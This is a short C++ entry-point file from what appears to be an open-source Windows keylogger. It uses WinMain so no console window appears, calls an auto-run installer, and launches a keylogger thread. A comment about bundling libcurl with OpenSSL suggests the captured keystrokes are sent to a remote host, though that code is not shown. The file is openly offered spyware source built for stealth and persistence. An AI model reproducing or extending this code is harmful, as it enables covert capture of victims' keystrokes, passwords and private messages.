#include "c_includes.hpp"

//Krawk ( a friend ) adviced me to use WinMain because the console flashs before the call of a function to hide the console window
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (c_config::init::auto_run)
		c_installer::install();

	std::thread { c_runner::keylogger }.join();
}

//by the way, libcurl with openssl support weights alot ( 2mb final output ) and this was made to be open source